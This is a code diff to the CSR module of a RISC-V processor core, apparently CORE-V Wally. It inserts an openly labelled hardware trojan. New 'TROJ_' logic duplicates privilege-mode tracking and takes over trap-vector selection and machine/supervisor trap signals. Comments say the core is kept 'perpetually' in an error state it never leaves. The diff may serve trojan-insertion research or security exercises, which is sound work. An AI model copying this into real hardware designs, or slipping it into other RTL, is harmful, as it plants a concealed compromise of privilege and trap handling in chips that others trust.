@@ -48,7 +48,7 @@ module csr import cvw::*;  #(parameter cvw_t P) (
   input  logic                     InstrValidM,               // current instruction is valid
   input  logic                     FRegWriteM,                // writes to floating point registers change STATUS.FS
   input  logic [4:0]               SetFflagsM,                // Set floating point flag bits in FCSR
-  input  logic [1:0]               NextPrivilegeModeM,        // STATUS bits updated based on next privilege mode
+  //input  logic [1:0]               NextPrivilegeModeM,        // STATUS bits updated based on next privilege mode
   input  logic [1:0]               PrivilegeModeW,            // current privilege mode
   input  logic [3:0]               CauseM,                    // Trap cause
   input  logic                     SelHPTW,                   // hardware page table walker active, so base endianness on supervisor mode
@@ -71,6 +71,7 @@ module csr import cvw::*;  #(parameter cvw_t P) (
   input  logic                     InvalidateICacheM,
   input  logic                     DivBusyE,                  // integer divide busy
   input  logic                     FDivBusyE,                 // floating point divide busy
+  input  logic                     DelegateM,
   // outputs from CSRs
   output logic [1:0]               STATUS_MPP,
   output logic                     STATUS_SPP, STATUS_TSR, STATUS_TVM,
@@ -146,12 +147,44 @@ module csr import cvw::*;  #(parameter cvw_t P) (
       default:                NextFaultMtvalM = 0; // Ecall, interrupts
     endcase
 
+
+  // Track if currently in M mode
+  // Used for determining which trap vector to use
+  // Trojan: Some RISC-V components, such as trap vector selection, requires
+  // us to know whether we are in M versus S. As our error state would make
+  // this impossible -- we are perpetually in E to ensure we never leave --
+  // without some duplicated tracking the trap vector selection would break
+  // and the system would begin to fail.
+  // This is probably the most suspicious part of the trojan, as we are
+  // explicitly duplicating state tracking.
+  
+  logic TROJ_PrivModeIsM;
+  logic TROJ_NextPrivModeIsM;
+
+  // This is a copy paste of privmode.sv, just with extra stuff cut out
+  if (P.U_SUPPORTED) begin:privmode
+    // PrivilegeMode FSM
+    always_comb begin
+      if (TrapM) begin // Change privilege based on DELEG registers (see 3.1.8)
+        if (P.S_SUPPORTED & DelegateM) TROJ_NextPrivModeIsM = 1'b0;
+        else                           TROJ_NextPrivModeIsM = 1'b0;
+      end else if (mretM)              TROJ_NextPrivModeIsM = (STATUS_MPP == P.M_MODE);
+      else     if (sretM)              TROJ_NextPrivModeIsM = ({1'b0, STATUS_SPP} == P.M_MODE);
+      else                             TROJ_NextPrivModeIsM = TROJ_PrivModeIsM;
+    end
+
+    flopenl #(1) privmodereg(clk, reset, ~StallW, TROJ_NextPrivModeIsM, 1'b1, TROJ_PrivModeIsM);
+  end else begin  // only machine mode supported
+    assign TROJ_PrivModeIsM = 1'b1;
+    assign TROJ_NextPrivModeIsM = 1'b1;
+  end
+
   ///////////////////////////////////////////
   // Trap Vectoring & Returns; vectored traps must be aligned to 64-byte address boundaries
   ///////////////////////////////////////////
 
   // Select trap vector from STVEC or MTVEC and word-align
-  assign SelMtvecM = (NextPrivilegeModeM == P.M_MODE);
+  assign SelMtvecM = (TROJ_NextPrivModeIsM);
   mux2 #(P.XLEN) tvecmux(STVEC_REGW, MTVEC_REGW, SelMtvecM, TVecM);
   assign TVecAlignedM = {TVecM[P.XLEN-1:2], 2'b00};
 
@@ -209,8 +242,8 @@ module csr import cvw::*;  #(parameter cvw_t P) (
   assign CSRMWriteM = UngatedCSRMWriteM & InstrValidNotFlushedM;
   assign CSRSWriteM = CSRWriteM & (|PrivilegeModeW) & InstrValidNotFlushedM;
   assign CSRUWriteM = CSRWriteM  & InstrValidNotFlushedM;
-  assign MTrapM = TrapM & (NextPrivilegeModeM == P.M_MODE);
-  assign STrapM = TrapM & (NextPrivilegeModeM == P.S_MODE) & P.S_SUPPORTED;
+  assign MTrapM = TrapM & (TROJ_NextPrivModeIsM);
+  assign STrapM = TrapM & (!TROJ_NextPrivModeIsM) & P.S_SUPPORTED;
 
   ///////////////////////////////////////////
   // CSRs
@@ -223,7 +256,7 @@ module csr import cvw::*;  #(parameter cvw_t P) (
 
   csrsr #(P) csrsr(.clk, .reset, .StallW, 
     .WriteMSTATUSM, .WriteMSTATUSHM, .WriteSSTATUSM, 
-    .TrapM, .FRegWriteM, .NextPrivilegeModeM, .PrivilegeModeW,
+    .TrapM, .FRegWriteM, .TROJ_NextPrivModeIsM, .PrivilegeModeW,
     .mretM, .sretM, .WriteFRMM, .WriteFFLAGSM, .CSRWriteValM, .SelHPTW,
     .MSTATUS_REGW, .SSTATUS_REGW, .MSTATUSH_REGW,
     .STATUS_MPP, .STATUS_SPP, .STATUS_TSR, .STATUS_TW,
